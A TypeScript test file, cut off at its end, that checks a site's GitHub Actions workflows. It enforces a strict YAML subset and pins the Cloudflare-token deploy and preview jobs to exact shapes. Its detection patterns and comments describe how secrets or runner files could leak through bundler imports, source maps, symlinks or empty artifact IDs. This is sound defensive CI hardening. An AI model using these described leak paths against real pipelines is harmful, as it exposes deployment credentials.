import { spawnSync } from 'node:child_process';
import { existsSync, mkdtempSync, readdirSync, readFileSync, rmdirSync, rmSync, symlinkSync, writeFileSync } from 'node:fs';
import { tmpdir } from 'node:os';
import { join } from 'node:path';
import { fileURLToPath } from 'node:url';
import { describe, expect, test } from 'vitest';

const root = (path: string) => fileURLToPath(new URL(`../../${path}`, import.meta.url));
// As the bytes are: a CR is refused below, not normalised away (.gitattributes checks workflows out as LF).
const read = (path: string) => readFileSync(root(path), 'utf8');

// GitHub runs every .yml and .yaml file in .github/workflows/, so every one is held to these rules.
const WORKFLOWS = new Map(
  readdirSync(root('.github/workflows'))
    .filter((name) => /\.ya?ml$/.test(name))
    .map((name) => [name, read(`.github/workflows/${name}`)]),
);

// ---------------------------------------------------------------------------------------------
// The canonical subset. There is no YAML parser among the dependencies, so every workflow must be
// written in a subset of block YAML that the line-based reading below sees exactly as GitHub does.
// A workflow holds only printable ASCII and LF, everywhere, comments and block scalars included:
// YAML also breaks lines at CR, NEL, LS and PS, and a split on LF would never see a line one of
// them starts. Indentation is spaces. Outside block scalars (the lines under a `key: |` or
// `key: >-` header), a line is blank, a comment, `key:` or `key: value` with a bare key, or `- `
// followed by one of those or by a value. Each nested block sits exactly two spaces under its key,
// and no mapping repeats a key. A value may not be a tag (!), anchor (&), alias (*), flow
// collection ({ or [) or complex key (?); a quoted value closes on its own line; and a
// double-quoted value holds no backslash, whose escapes could spell anything, `secrets` included.
// The keys that hold a mapping (env, with, ...) hold it on the lines below, never as one value
// (an expression, or `inherit`) whose entries no line-based check could see.
// ---------------------------------------------------------------------------------------------

const KEY = /^([A-Za-z_][\w-]*):(?: (.*))?$/;
const BLOCK_SCALAR = /^[|>][-+]?$/;
const OUTSIDE_ASCII = /[^\x20-\x7E]/;
const CHARACTER_NAMES: Record<string, string> = {
  '\t': 'tab',
  '\r': 'CR',
  '\u0085': 'NEL',
  '\u00A0': 'NBSP',
  '\u2028': 'LS',
  '\u2029': 'PS',
  '\uFEFF': 'BOM',
};
const MAPPING_ONLY = new Set(['env', 'with', 'secrets', 'outputs', 'services', 'container', 'strategy', 'defaults', 'inputs', 'permissions']);
/** The leading ASCII spaces: a tab, an NBSP or any other whitespace is not indentation. */
const indentOf = (line: string) => /^ */.exec(line)![0].length;
/** `U+000D (CR)`: a character by its code point, and by name if it's one of the usual suspects. */
function codePoint(c: string): string {
  const name = CHARACTER_NAMES[c];
  return `U+${c.codePointAt(0)!.toString(16).toUpperCase().padStart(4, '0')}${name ? ` (${name})` : ''}`;
}
/** A line as printable ASCII, with every other character written as `<U+000D (CR)>`. */
const visible = (line: string) => line.replace(/[^\x20-\x7E]/gu, (c) => `<${codePoint(c)}>`);

/** What is wrong with a value after `key: ` or `- `, if anything. */
function valueError(value: string): string | undefined {
  if (BLOCK_SCALAR.test(value)) return undefined;
  if (/^\s/.test(value)) return 'more than one space before a value';
  if (/^[!&*{[?%@`|>#,]/.test(value)) return 'a tag, anchor, alias, flow collection, complex key, directive or comment in place of a value';
  if (/^-(?: |$)/.test(value)) return 'a sequence in place of a value';
  if (value.startsWith('"') && !/^"[^"\\]*"(?: +#.*)?$/.test(value)) return 'a double-quoted value with a backslash, or one that does not close on its line';
  if (value.startsWith("'") && !/^'(?:[^']|'')*'(?: +#.*)?$/.test(value)) return 'a single-quoted value that does not close on its line';
  return undefined;
}

/** Reads a workflow as the canonical subset: the lines outside it, and which lines are YAML comments. */
function readCanonical(file: string, text: string): { errors: string[]; comments: Set<number> } {
  const errors: string[] = [];
  const comments = new Set<number>();
  // The open blocks: each sequence or mapping, at its indentation, with the keys it has seen.
  const levels: { indent: number; sequence: boolean; keys: Set<string> }[] = [];
  let parent: number | undefined; // the column of a `key:` whose nested block may come next
  let scalarParent = -1; // the column of the key, or dash, whose block scalar this is
  text.split('\n').forEach((line, i) => {
    const fail = (why: string) => {
      errors.push(`${file}:${i + 1}: ${why}: ${visible(line).trim()}`);
    };
    // First, before blank lines, comments or block scalars are set aside: this holds everywhere.
    const odd = OUTSIDE_ASCII.exec(line);
    if (odd) return fail(`column ${odd.index + 1} is ${codePoint(odd[0])}, but a workflow holds only printable ASCII and LF`);
    if (/^ *$/.test(line)) return;
    const indent = indentOf(line);
    if (scalarParent >= 0 && indent > scalarParent) return;
    scalarParent = -1;
    if (line.slice(indent).startsWith('#')) return void comments.add(i);
    const item = line.slice(indent).startsWith('- ');
    if (parent !== undefined && indent > parent) {
      if (indent !== parent + 2) fail('a nested block not indented two spaces under its key');
      levels.push({ indent, sequence: item, keys: new Set() });
    } else {
      while (levels.length > 0 && levels.at(-1)!.indent > indent) levels.pop();
      if (levels.length === 0 && indent === 0) levels.push({ indent, sequence: item, keys: new Set() });
      if (levels.at(-1)?.indent !== indent) return fail('an indentation that matches no open block');
    }
    parent = undefined;
    const level = levels.at(-1)!;
    if (level.sequence !== item) return fail(item ? 'a sequence item among keys' : 'a key among sequence items');
    let node = line.slice(indent);
    let column = indent;
    let keys = level.keys;
    if (item) {
      node = node.slice(2);
      column += 2;
      if (!KEY.test(node)) {
        const why = /^-(?: |$)/.test(node) ? 'a nested sequence' : valueError(node);
        if (why) return fail(why);
        if (BLOCK_SCALAR.test(node)) scalarParent = indent;
        return;
      }
      const mapping = { indent: column, sequence: false, keys: new Set<string>() };
      levels.push(mapping);
      keys = mapping.keys;
    }
    const [, key, value] = KEY.exec(node) ?? [];
    if (key === undefined) return fail('not a bare `key:` or `key: value`');
    if (keys.has(key)) return fail(`a second "${key}" in one mapping`);
    keys.add(key);
    if (value === undefined) {
      parent = column;
      return;
    }
    const why = valueError(value);
    if (why) return fail(why);
    if (BLOCK_SCALAR.test(value)) scalarParent = column;
    if (MAPPING_ONLY.has(key)) fail(`"${key}" must be a mapping on the lines below, not a value on its own line`);
  });
  return { errors, comments };
}

const CANONICAL = new Map([...WORKFLOWS].map(([file, text]) => [file, readCanonical(file, text)]));

/** A workflow's lines without its YAML comments. Block-scalar lines stay, `#` or not: GitHub reads them. */
const codeOf = (text: string, comments: Set<number>) => text.split('\n').filter((_line, i) => !comments.has(i));
const code = (file: string) => codeOf(WORKFLOWS.get(file)!, CANONICAL.get(file)!.comments);
/** The non-blank lines under `jobs:`. */
const jobLinesOf = (lines: string[]) => lines.slice(lines.indexOf('jobs:') + 1).filter((line) => line.trim() !== '');
const jobLines = (file: string) => jobLinesOf(code(file));
const JOB_KEY = /^ {2}[\w-]+:$/;

/** A workflow's jobs by name, each the text of its block, split on the two-space job keys. `text` is for the self-tests. */
function jobBlocks(file: string, text = WORKFLOWS.get(file)!): Map<string, string> {
  const canonical = readCanonical(file, text);
  const lines = jobLinesOf(codeOf(text, canonical.comments));
  const starts = lines.flatMap((line, i) => (JOB_KEY.test(line) ? [i] : []));
  if (starts.length === 0) {
    // A file outside the subset (CRLF line endings, say) can hide every job: say why first.
    const why = canonical.errors.slice(0, 3);
    throw new Error(`found no jobs in ${file}: has its layout changed?${why.length > 0 ? `\n${why.join('\n')}` : ''}`);
  }
  return new Map(starts.map((start, i) => [lines[start]!.trim().slice(0, -1), lines.slice(start, starts[i + 1]).join('\n')]));
}

const JOBS = new Map<string, string>(
  [...WORKFLOWS.keys()].flatMap((file) => [...jobBlocks(file)].map(([name, block]) => [`${file}:${name}`, block] as [string, string])),
);
const job = (name: string) => JOBS.get(name) ?? '';

/** A job's steps: its `steps:` block, split on the six-space `- ` that starts each one. */
function steps(block: string): string[] {
  const lines = block.split('\n');
  const at = lines.indexOf('    steps:');
  if (at === -1) return [];
  const body = lines.slice(at + 1);
  const end = body.findIndex((line) => !line.startsWith('      '));
  return (end === -1 ? body : body.slice(0, end)).join('\n').split(/^ {6}- /m).slice(1);
}
/** A step's own scalar key (`uses`, `id`, `if`, `run`): on the step's first line, or at eight spaces. */
const stepValue = (step: string, key: string) => new RegExp(`^(?: {8})?${key}: (.*)$`, 'm').exec(step)?.[1];
/** The keys and values of a mapping (`with`, `env`, `outputs`) that sits `indent` spaces deep, one level down. */
function mapping(text: string, key: string, indent: number): Map<string, string> {
  const lines = text.split('\n');
  const at = lines.findIndex((line) => line === `${' '.repeat(indent)}${key}:` || (indent === 8 && line === `${key}:`));
  const out = new Map<string, string>();
  if (at === -1) return out;
  for (const line of lines.slice(at + 1)) {
    if (indentOf(line) <= indent) break;
    const entry = new RegExp(`^ {${indent + 2}}([\\w-]+):(?: (.*))?$`).exec(line);
    if (entry) out.set(entry[1]!, entry[2] ?? '');
  }
  return out;
}
/** A block scalar's lines (`run: |`, `sparse-checkout: |`), dedented; or the plain value. */
function scalar(step: string, key: string, indent: number): string | undefined {
  const lines = step.split('\n');
  const at = lines.findIndex((line) => new RegExp(`^(?: {${indent}})?${key}:`).test(line));
  if (at === -1) return undefined;
  const value = lines[at]!.replace(new RegExp(`^(?: {${indent}})?${key}:\\s*`), '');
  if (!/^[|>]/.test(value)) return value;
  const body: string[] = [];
  for (const line of lines.slice(at + 1)) {
    if (!line.startsWith(' '.repeat(indent + 2))) break;
    body.push(line.slice(indent + 2));
  }
  return body.join('\n');
}
/** A job's needs, as a scalar or a block sequence. */
function needs(block: string): string[] {
  const one = /^ {4}needs: (\S+)$/m.exec(block);
  if (one) return [one[1]!];
  const lines = block.split('\n');
  const at = lines.indexOf('    needs:');
  if (at === -1) return [];
  const out: string[] = [];
  for (const line of lines.slice(at + 1)) {
    const entry = /^ {6}- ([\w-]+)$/.exec(line);
    if (!entry) break;
    out.push(entry[1]!);
  }
  return out;
}
/** A job's own `if:`, folded or not. */
const condition = (block: string) => /^ {4}if:([\s\S]*?)^ {4}\w/m.exec(block)?.[1] ?? '';
/** A step's action, without its pin: `actions/checkout`. */
const action = (step: string) => stepValue(step, 'uses')?.split('@')[0];

// A job holds the Cloudflare token if it names secrets at all, in any form (secrets.X,
// secrets['X'], toJSON(secrets), secrets: inherit), other than the GITHUB_TOKEN every job has.
// The canonical subset keeps a reference from hiding behind a YAML escape.
const holdsSecrets = (text: string) => /\bsecrets\b(?!\.GITHUB_TOKEN\b)/i.test(text);

const COOLDOWN_DAYS = [...read('.github/dependabot.yml').matchAll(/default-days: (\d+)/g)].map((match) => match[1]);
const PIN = /^(actions\/[\w-]+|cloudflare\/wrangler-action)@[0-9a-f]{40} # v\d+\.\d+\.\d+$/;
const TOP_LEVEL_KEYS = ['name', 'run-name', 'on', 'permissions', 'concurrency', 'jobs'];
const RUNNER = "${{ vars.CI_LINUX_RUNNER || 'ubuntu-latest' }}";
// verify on a push to main builds the artifact that deploys, so it too runs on a GitHub-hosted runner.
const VERIFY_RUNNER = "${{ github.event_name == 'push' && 'ubuntu-latest' || vars.CI_LINUX_RUNNER || 'ubuntu-latest' }}";
const ENABLED = "env.HAS_CLOUDFLARE == 'true'";
// deploy's steps after the head check also wait for its answer: this commit is main's head.
const AT_HEAD = `${ENABLED} && steps.head.outputs.current == 'true'`;
// The first step of deploy that holds a token of any kind: it reads main's head with the job's own
// GITHUB_TOKEN, passed in through env (never interpolated into the script, which zizmor refuses),
// and fails the job when it cannot, rather than deploy on a check that did not happen.
const HEAD_CHECK = [
  'if ! head="$(gh api "repos/$REPO/git/ref/heads/main" --jq .object.sha)" || [ -z "$head" ]; then',
  '  echo "::error::could not read main\'s head, so nothing deploys"',
  '  exit 1',
  'fi',
  'if [ "$head" = "$SHA" ]; then',
  '  echo "current=true" >> "$GITHUB_OUTPUT"',
  'else',
  '  echo "current=false" >> "$GITHUB_OUTPUT"',
  '  echo "::notice title=Deploy skipped::main\'s head is now $head, not $SHA; deploy it from the run for $head, and re-run that run if it did not deploy"',
  'fi',
].join('\n');
const TRUSTED_FILES = ['/.nvmrc', '/package.json', '/scripts/trusted-config.mjs', '/wrangler.jsonc'];
const SITE = '${{ runner.temp }}/site';
const TRUSTED_CONFIG = 'node trusted/scripts/trusted-config.mjs trusted';
const VERSION_CHECK = 'test -n "$WRANGLER_VERSION" || { echo "::error::trusted-config.mjs gave no wrangler version"; exit 1; }';
// npm 11.10.0 added min-release-age; an older npm only warns about it, and installs with no floor.
// No `npm config get` output tells a working npm 11.16+ from npm 10, so the check reads the version.
const FLOOR_CHECK = [
  "node -e '",
  '  const version = process.argv[1];',
  '  const parts = /^(\\d+)\\.(\\d+)\\.(\\d+)$/.exec(version);',
  '  const [major, minor] = parts ? [Number(parts[1]), Number(parts[2])] : [NaN, NaN];',
  '  if (!(major > 11 || (major === 11 && minor >= 10))) {',
  '    console.log(`::error::npm ${version || "(no version)"} predates min-release-age (npm 11.10.0), so it would install with no floor`);',
  '    process.exit(1);',
  '  }',
  '  console.log(`npm ${version} applies min-release-age`);',
  `' "$(npm --version)"`,
].join('\n');
const COPY_SITE = [
  'mkdir -p "$RUNNER_TEMP/site/bundle"',
  'cp -R "$RUNNER_TEMP/artifact/dist" "$RUNNER_TEMP/site/dist"',
  'cp "$RUNNER_TEMP/artifact/bundle/worker.js" "$RUNNER_TEMP/site/bundle/worker.js"',
  'cp trusted/wrangler.jsonc "$RUNNER_TEMP/site/wrangler.jsonc"',
].join('\n');
const COPY_CONFIG = ['mkdir -p "$RUNNER_TEMP/site"', 'cp trusted/wrangler.jsonc "$RUNNER_TEMP/site/wrangler.jsonc"'].join('\n');
// The preview job copies no config: wrangler bundles the worker.js it is given unless its config
// says no_bundle, and its bundler follows an import in that file to any file on the runner (sweep
// 20261027T190359Z, cluster 1). trusted-config.mjs writes the config from the trusted one, and the
// job stops unless the file is there, never falling back to a copy.
const COPY_PREVIEW_SITE = [
  'mkdir -p "$RUNNER_TEMP/site/bundle"',
  'cp -R "$RUNNER_TEMP/artifact/dist" "$RUNNER_TEMP/site/dist"',
  'cp "$RUNNER_TEMP/artifact/bundle/worker.js" "$RUNNER_TEMP/site/bundle/worker.js"',
].join('\n');
const PREVIEW_CONFIG_FILE = 'wrangler.json';
const WRITE_PREVIEW_CONFIG = `node trusted/scripts/trusted-config.mjs --preview-config trusted "$RUNNER_TEMP/site/${PREVIEW_CONFIG_FILE}"`;
const PREVIEW_CONFIG_CHECK = `test -f "$RUNNER_TEMP/site/${PREVIEW_CONFIG_FILE}" || { echo "::error::trusted-config.mjs wrote no preview config"; exit 1; }`;
// After the copy, in both jobs that take an artifact: wrangler follows a link it finds among the
// assets (it stat()s each one), so the job stops if the site directory holds one. The search runs as
// an assignment, so a find that fails stops the job too, where `test -z "$(find ...)"` would pass.
const SYMLINK_CHECK =
  'links="$(find "$RUNNER_TEMP/site" -type l)" && test -z "$links" || { echo "::error::the site directory holds a symlink, or find could not search it"; exit 1; }';
// An empty artifact-ids makes download-artifact take every artifact in the run, so the ID must be
// one number: non-empty, with nothing left once its digits are removed.
const ID_CHECK =
  'test -n "$ARTIFACT_ID" && test -z "${ARTIFACT_ID//[0123456789]/}" || { echo "::error::the artifact ID is empty or not a number, and an empty one would download every artifact in the run"; exit 1; }';
// download-artifact v8 is the first to fail on a digest mismatch by default (digest-mismatch: error).
const DOWNLOAD_MAJOR = 8;
const NOTICE = /^echo "::notice title=\w+ skipped::[^"$`\\]*"$/;
// What each action may be given in a job that holds the token: a preCommands or a mirror would run
// or fetch something the trusted ref did not choose, and a download by name could take a
// replacement artifact.
const INPUTS: Record<string, string[]> = {
  'actions/checkout': ['ref', 'path', 'sparse-checkout', 'sparse-checkout-cone-mode', 'persist-credentials'],
  'actions/setup-node': ['node-version-file', 'package-manager-cache'],
  'actions/download-artifact': ['artifact-ids', 'path'],
  'actions/github-script': ['script'],
  'cloudflare/wrangler-action': ['apiToken', 'accountId', 'wranglerVersion', 'workingDirectory', 'command'],
};
const STEP_ENV = ['GH_TOKEN', 'REPO', 'SHA', 'WRANGLER_VERSION', 'ARTIFACT_ID', 'PREVIEW_URL', 'npm_config_ignore_scripts', 'npm_config_min_release_age'];
const ARTIFACT_ID = '${{ steps.upload.outputs.artifact-id }}';

// The jobs that hold the token: the environment each runs through, the ref it trusts, the job whose
// artifact it deploys, its one wrangler command, the scripts of its own that put the site and its
// config in place, and the files those scripts copy.
const TOKEN_JOBS = {
  'ci.yml:deploy': {
    environment: 'production',
    ref: '${{ github.sha }}',
    builder: 'verify',
    // --upload-source-maps=false: a sourceMappingURL in worker.js could name any file on the runner (Ruling 96).
    command: 'deploy bundle/worker.js --no-bundle --upload-source-maps=false --config wrangler.jsonc',
    gate: AT_HEAD,
    scripts: [HEAD_CHECK, ID_CHECK, COPY_SITE, SYMLINK_CHECK],
    copies: ['"$RUNNER_TEMP/artifact/bundle/worker.js"', '"$RUNNER_TEMP/artifact/dist"', 'trusted/wrangler.jsonc'],
  },
  'ci.yml:preview': {
    environment: 'preview',
    ref: 'refs/heads/${{ github.event.repository.default_branch }}',
    builder: 'preview-build',
    command: `preview bundle/worker.js --name pr-\${{ github.event.pull_request.number }} --config ${PREVIEW_CONFIG_FILE}`,
    gate: ENABLED,
    scripts: [ID_CHECK, COPY_PREVIEW_SITE, SYMLINK_CHECK, WRITE_PREVIEW_CONFIG, PREVIEW_CONFIG_CHECK],
    copies: ['"$RUNNER_TEMP/artifact/bundle/worker.js"', '"$RUNNER_TEMP/artifact/dist"'],
  },
  'ci.yml:preview-cleanup': {
    environment: 'preview',
    ref: 'refs/heads/${{ github.event.repository.default_branch }}',
    builder: undefined,
    command: 'preview delete --name pr-${{ github.event.pull_request.number }} --config wrangler.jsonc',
    gate: ENABLED,
    scripts: [COPY_CONFIG],
    copies: ['trusted/wrangler.jsonc'],
  },
};

// ---------------------------------------------------------------------------------------------
// The pin (Ruling 77). Each token job is exactly the job below: its keys, from an allow-list; its
// steps, in order, each by its action at its SHA or its exact script; every `if`, `id`, `with`
// and `env` value as written; and step keys from an allow-list. Only the names are free. So any
// change to a token job, a Dependabot bump of one of its actions included, changes this pin too,
// after review. `secrets` appears only on the HAS_CLOUDFLARE line and in wrangler-action's
// apiToken and accountId.
// ---------------------------------------------------------------------------------------------

/** A value in the canonical subset: a scalar as written (a block scalar as its header and dedented lines), a sequence or a mapping. */
type Yaml = string | Yaml[] | { [key: string]: Yaml };
const isMapping = (value: Yaml | undefined): value is { [key: string]: Yaml } => typeof value === 'object' && !Array.isArray(value);

const TOKEN_ACTIONS = {
  checkout: 'actions/checkout@3d3c42e5aac5ba805825da76410c181273ba90b1',
  setupNode: 'actions/setup-node@949feb2413d6458794dcd2491c4babbbce0c15c1',
  download: 'actions/download-artifact@3e5f45b2cfb9172054b4087a40e8e0b5a5461e7c',
  githubScript: 'actions/github-script@3a2844b7e9c422d3c10d287c895573f7108da1b3',
  wrangler: 'cloudflare/wrangler-action@953926a2e2182532811c01a25e53647d93bf07c0',
};
const TOKEN_JOB_KEYS = ['name', 'if', 'needs', 'runs-on', 'environment', 'permissions', 'env', 'steps'];
const TOKEN_STEP_KEYS = ['name', 'id', 'if', 'uses', 'with', 'env', 'run'];
const HAS_CLOUDFLARE = "${{ secrets.CLOUDFLARE_API_TOKEN != '' }}";
const WRANGLER_VERSION_OUTPUT = '${{ steps.trusted.outputs.wrangler-version }}';
const literal = (text: string) => `|\n${text}`;
const folded = (...lines: string[]) => ['>-', ...lines].join('\n');
const previewGate = (action: string) =>
  folded(
    "vars.CI_PREVIEWS == 'true' &&",
    `github.event_name == 'pull_request' && github.event.action ${action} &&`,
    'github.event.pull_request.head.repo.full_name == github.repository &&',
    'github.event.pull_request.base.ref == github.event.repository.default_branch',
  );
const notice = (title: string, text: string) => ({ if: "env.HAS_CLOUDFLARE != 'true'", run: `echo "::notice title=${title} skipped::${text}"` });
const enabled = (step: { [key: string]: Yaml }, gate = ENABLED) => ({ if: gate, ...step });
const trustedSteps = (ref: string, gate = ENABLED) => [
  enabled(
    {
      uses: TOKEN_ACTIONS.checkout,
      with: { ref, path: 'trusted', 'sparse-checkout': literal(TRUSTED_FILES.join('\n')), 'sparse-checkout-cone-mode': 'false', 'persist-credentials': 'false' },
    },
    gate,
  ),
  enabled({ uses: TOKEN_ACTIONS.setupNode, with: { 'node-version-file': 'trusted/.nvmrc', 'package-manager-cache': 'false' } }, gate),
  enabled({ id: 'trusted', run: TRUSTED_CONFIG }, gate),
  enabled({ env: { WRANGLER_VERSION: WRANGLER_VERSION_OUTPUT }, run: VERSION_CHECK }, gate),
  enabled({ run: literal(FLOOR_CHECK) }, gate),
];
const siteSteps = (builder: string, copy: string, gate = ENABLED) => {
  const id = `\${{ needs.${builder}.outputs.site-artifact-id }}`;
  return [
    enabled({ env: { ARTIFACT_ID: id }, run: ID_CHECK }, gate),
    enabled({ uses: TOKEN_ACTIONS.download, with: { 'artifact-ids': id, path: '${{ runner.temp }}/artifact' } }, gate),
    enabled({ run: literal(copy) }, gate),
    enabled({ run: SYMLINK_CHECK }, gate),
  ];
};
const wranglerStep = (command: string, id?: string, gate = ENABLED) =>
  enabled(
    {
      ...(id ? { id } : {}),
      uses: TOKEN_ACTIONS.wrangler,
      env: { npm_config_ignore_scripts: "'true'", npm_config_min_release_age: `'${COOLDOWN_DAYS[0]}'` },
      with: {
        apiToken: '${{ secrets.CLOUDFLARE_API_TOKEN }}',
        accountId: '${{ secrets.CLOUDFLARE_ACCOUNT_ID }}',
        wranglerVersion: WRANGLER_VERSION_OUTPUT,
        workingDirectory: SITE,
        command,
      },
    },
    gate,
  );
const PREVIEW_COMMENT = [
  "const marker = '<!-- cloudflare-site-template:preview -->';",
  'const sha = context.payload.pull_request.head.sha.slice(0, 7);',
  'const body = [',
  '  marker,',
  '  `**Preview:** ${process.env.PREVIEW_URL}`,',
  "  '',",
  "  `Built from ${sha} with Turnstile's test keys and \\`log\\` delivery: the form works and sends nothing.`,",
  "].join('\\n');",
  'const { owner, repo } = context.repo;',
  'const issue_number = context.payload.pull_request.number;',
  'const comments = await github.paginate(github.rest.issues.listComments, { owner, repo, issue_number });',
  "const mine = comments.find((comment) => comment.user?.type === 'Bot' && comment.body?.startsWith(marker));",
  'if (mine) await github.rest.issues.updateComment({ owner, repo, comment_id: mine.id, body });',
  'else await github.rest.issues.createComment({ owner, repo, issue_number, body });',
].join('\n');
const SECRETS_IN = 'CLOUDFLARE_API_TOKEN and CLOUDFLARE_ACCOUNT_ID secrets in the';

const TOKEN_JOB_SHAPES: Record<keyof typeof TOKEN_JOBS, { [key: string]: Yaml }> = {
  'ci.yml:deploy': {
    if: "github.event_name == 'push' && github.ref == 'refs/heads/main'",
    needs: ['verify', 'e2e'],
    'runs-on': 'ubuntu-latest',
    environment: 'production',
    env: { HAS_CLOUDFLARE },
    steps: [
      notice('Deploy', `Set the ${SECRETS_IN} production environment (or as repository secrets, on a private GitHub Free repository) to deploy from CI.`),
      enabled({ id: 'head', env: { GH_TOKEN: '${{ github.token }}', REPO: '${{ github.repository }}', SHA: '${{ github.sha }}' }, run: literal(HEAD_CHECK) }),
      ...trustedSteps(TOKEN_JOBS['ci.yml:deploy'].ref, AT_HEAD),
      ...siteSteps('verify', COPY_SITE, AT_HEAD),
      wranglerStep(TOKEN_JOBS['ci.yml:deploy'].command, undefined, AT_HEAD),
    ],
  },
  'ci.yml:preview': {
    if: previewGate("!= 'closed'"),
    needs: 'preview-build',
    'runs-on': 'ubuntu-latest',
    environment: 'preview',
    permissions: { contents: 'read', 'pull-requests': 'write' },
    env: { HAS_CLOUDFLARE },
    steps: [
      notice('Preview', `Set the ${SECRETS_IN} preview environment, behind required reviewers, to get a preview per pull request. Repository secrets reach this job too, unreviewed.`),
      ...trustedSteps(TOKEN_JOBS['ci.yml:preview'].ref),
      ...siteSteps('preview-build', COPY_PREVIEW_SITE),
      enabled({ run: WRITE_PREVIEW_CONFIG }),
      enabled({ run: PREVIEW_CONFIG_CHECK }),
      wranglerStep(TOKEN_JOBS['ci.yml:preview'].command, 'preview'),
      enabled({ uses: TOKEN_ACTIONS.githubScript, env: { PREVIEW_URL: '${{ steps.preview.outputs.preview-url }}' }, with: { script: literal(PREVIEW_COMMENT) } }),
    ],
  },
  'ci.yml:preview-cleanup': {
    if: previewGate("== 'closed'"),
    'runs-on': 'ubuntu-latest',
    environment: 'preview',
    env: { HAS_CLOUDFLARE },
    steps: [...trustedSteps(TOKEN_JOBS['ci.yml:preview-cleanup'].ref), enabled({ run: literal(COPY_CONFIG) }), wranglerStep(TOKEN_JOBS['ci.yml:preview-cleanup'].command)],
  },
};

/**
 * Reads lines in the canonical subset, without comments or blank lines, into values: a plain
 * scalar without its comment, a quoted one as written, a block scalar as its header line and its
 * lines dedented. Mappings have no prototype, so no key (`__proto__` included) can hide. `rest` is
 * whatever it could not place.
 */
function readYaml(input: string[]): { value: Yaml; rest: string[] } {
  const lines = [...input];
  let i = 0;
  const scalar = (raw: string, column: number): Yaml => {
    if (raw === '') return node(column + 2);
    if (BLOCK_SCALAR.test(raw)) {
      const body: string[] = [];
      while (i < lines.length && indentOf(lines[i]!) > column) body.push(lines[i++]!);
      const by = body.length > 0 ? indentOf(body[0]!) : 0;
      return [raw, ...body.map((line) => line.slice(by))].join('\n');
    }
    return /^(?:'(?:[^']|'')*'|"[^"]*")/.exec(raw)?.[0] ?? raw.replace(/ +#.*$/, '');
  };
  const node = (indent: number): Yaml => {
    if (i >= lines.length || indentOf(lines[i]!) !== indent) return '';
    if (lines[i]!.startsWith('- ', indent)) {
      const items: Yaml[] = [];
      while (i < lines.length && indentOf(lines[i]!) === indent && lines[i]!.startsWith('- ', indent)) {
        const item = lines[i]!.slice(indent + 2);
        if (KEY.test(item)) {
          // `- key: value` opens a mapping two columns in: read it there.
          lines[i] = `${' '.repeat(indent + 2)}${item}`;
          items.push(node(indent + 2));
        } else {
          i++;
          items.push(scalar(item, indent));
        }
      }
      return items;
    }
    const map: { [key: string]: Yaml } = Object.create(null);
    while (i < lines.length && indentOf(lines[i]!) === indent) {
      const entry = KEY.exec(lines[i]!.slice(indent));
      if (!entry) break;
      i++;
      map[entry[1]!] = scalar(entry[2] ?? '', indent);
    }
    return map;
  };
  const value = node(lines.length > 0 ? indentOf(lines[0]!) : 0);
  return { value, rest: lines.slice(i) };
}

/** JSON with every mapping's keys sorted, so two values compare as text. */
const stable = (value: Yaml | undefined) =>
  JSON.stringify(value, (_key, inner: unknown) =>
    inner && typeof inner === 'object' && !Array.isArray(inner) ? Object.fromEntries(Object.entries(inner).sort(([a], [b]) => (a < b ? -1 : a > b ? 1 : 0))) : inner,
  ) ?? '(none)';
const unnamed = (value: Yaml | undefined) => (isMapping(value) ? Object.fromEntries(Object.entries(value).filter(([key]) => key !== 'name')) : value);
/** `step 3: with.apiToken`, or `env.HAS_CLOUDFLARE`: a place in a job, steps counted from one as GitHub shows them. */
const place = (path: string[]) => (path[0] === 'steps' && path.length > 1 ? `step ${Number(path[1]) + 1}: ${path.slice(2).join('.')}` : path.join('.'));
/**
 * Where a job names secrets, in any form, by place: every key that does, and every scalar that does
 * in an expression, which starts at its first `${{`, or is the whole of an `if`. The skip notices
 * say "secrets" in prose, outside any expression.
 */
function secretPlaces(value: Yaml, path: string[] = []): string[] {
  if (typeof value === 'string') {
    const at = value.indexOf('${{');
    const expression = path.at(-1) === 'if' ? value : at === -1 ? '' : value.slice(at);
    return /\bsecrets\b/i.test(expression) ? [place(path)] : [];
  }
  const entries = Array.isArray(value) ? value.map((item, i) => [String(i), item] as const) : Object.entries(value);
  return entries.flatMap(([key, inner]) => [...(/\bsecrets\b/i.test(key) ? [place([...path, key])] : []), ...secretPlaces(inner, [...path, key])]);
}

/** What makes a token job other than its pin: unknown keys, `secrets` out of place, and any other difference. */
function tokenJobProblems(name: keyof typeof TOKEN_JOBS, block: string): { keys: string[]; secrets: string[]; shape: string[] } {
  const pinned = TOKEN_JOB_SHAPES[name];
  const { value, rest } = readYaml(block.split('\n').slice(1));
  const job = isMapping(value) ? value : {};
  const steps = Array.isArray(job.steps) ? job.steps : [];
  const pinnedSteps = pinned.steps as Yaml[];

  const keys = [
    ...Object.keys(job).flatMap((key) => (TOKEN_JOB_KEYS.includes(key) ? [] : [`job key "${key}" is not one a token job may have`])),
    ...steps.flatMap((step, i) =>
      Object.keys(isMapping(step) ? step : {}).flatMap((key) => (TOKEN_STEP_KEYS.includes(key) ? [] : [`step ${i + 1}: "${key}" is not a key a token job's step may have`])),
    ),
  ];

  // The reader places every line, or the shape check below says so, so this sees every key and value.
  const wrangler = steps.findIndex((step) => isMapping(step) && step.uses === TOKEN_ACTIONS.wrangler);
  const allowed = ['env.HAS_CLOUDFLARE', ...(wrangler === -1 ? [] : ['apiToken', 'accountId'].map((input) => `step ${wrangler + 1}: with.${input}`))];
  const secrets = secretPlaces(job).flatMap((at) => (allowed.includes(at) ? [] : [`${at} names secrets`]));

  const shape = [
    ...(rest.length > 0 ? [`lines the pin cannot place, from: ${rest[0]!.trim()}`] : []),
    ...Object.keys({ ...job, ...pinned })
      .filter((key) => key !== 'name' && key !== 'steps' && stable(job[key]) !== stable(pinned[key]))
      .map((key) => `job ${key}: ${stable(job[key])}, but the pin is ${stable(pinned[key])}`),
    ...(steps.length === pinnedSteps.length ? [] : [`${steps.length} steps, but the pin has ${pinnedSteps.length}`]),
    ...Array.from({ length: Math.max(steps.length, pinnedSteps.length) }, (_, i) => {
      const [actual, want] = [unnamed(steps[i]), pinnedSteps[i]];
      if (stable(actual) === stable(want)) return [];
      // A Dependabot bump moves an action's SHA: name it, so the pin moves with it once the new commit is checked.
      const [uses, pin] = [isMapping(actual) ? actual.uses : undefined, isMapping(want) ? want.uses : undefined];
      const bumped = typeof uses === 'string' && typeof pin === 'string' && uses !== pin && uses.split('@')[0] === pin.split('@')[0];
      return [`step ${i + 1}: ${stable(actual)}, but the pin is ${stable(want)}${bumped ? ` (a new SHA for ${pin.split('@')[0]}: check that commit, then move TOKEN_ACTIONS)` : ''}`];
    }).flat(),
  ];
  return { keys, secrets, shape };
}

describe.each([...WORKFLOWS.keys()])('%s', (file) => {
